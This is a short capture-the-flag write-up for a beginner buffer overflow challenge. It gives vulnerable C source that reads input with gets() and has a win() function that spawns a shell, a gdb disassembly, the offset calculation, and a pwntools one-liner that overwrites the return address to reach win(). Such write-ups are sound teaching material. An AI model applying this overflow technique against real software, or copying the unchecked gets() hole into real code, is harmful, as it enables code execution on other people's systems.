# Bof : 

Challenge description : ```A Simple bof for you!```

* Given source code : 
```
#include<stdio.h>
#include <unistd.h>
int win(){
	execve("/bin/sh",NULL,NULL);
}
int initialize(){
	alarm(30);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stdin,NULL,2,0);
}
int main(){
	initialize();
	char buf[24];
	printf("Do you think you've got what it take to kill Thanos ?\n");
	puts("Send it to me then......");
	gets(buf);
	return 0;
}
```
* From the above source code we can see that, all we need to do is call the win function which contains the shell. 

# Gdb dump : 
```
   0x0000000000401230 <+8>:	sub    rsp,0x20
   0x0000000000401234 <+12>:	mov    eax,0x0
   0x0000000000401239 <+17>:	call   0x4011d7 <initialize>
   0x000000000040123e <+22>:	lea    rdi,[rip+0xdcb]        # 0x402010
   0x0000000000401245 <+29>:	call   0x401080 <puts@plt>
   0x000000000040124a <+34>:	lea    rdi,[rip+0xdf5]        # 0x402046
   0x0000000000401251 <+41>:	call   0x401080 <puts@plt>
   0x0000000000401256 <+46>:	lea    rax,[rbp-0x20]
   0x000000000040125a <+50>:	mov    rdi,rax
   0x000000000040125d <+53>:	mov    eax,0x0
   0x0000000000401262 <+58>:	call   0x4010b0 <gets@plt>
   0x0000000000401267 <+63>:	mov    eax,0x0
   0x000000000040126c <+68>:	leave  
   0x000000000040126d <+69>:	ret
   
   ```
 * from the above gdb dump, we can see that stack defined is of size 0x20 or 32 bytes.
 * to overflow eip and call the win function, we may have to give buffer size as 32 + 8 bytes (since its a 64 bit compiled program)
 * address of win function is : ```0x00000000004011b6```  

# Python code : 
```
(python -c "from pwn import *; print('A'*40 + p64(0x00000000004011b6))"; cat) | ./bof.bof
```

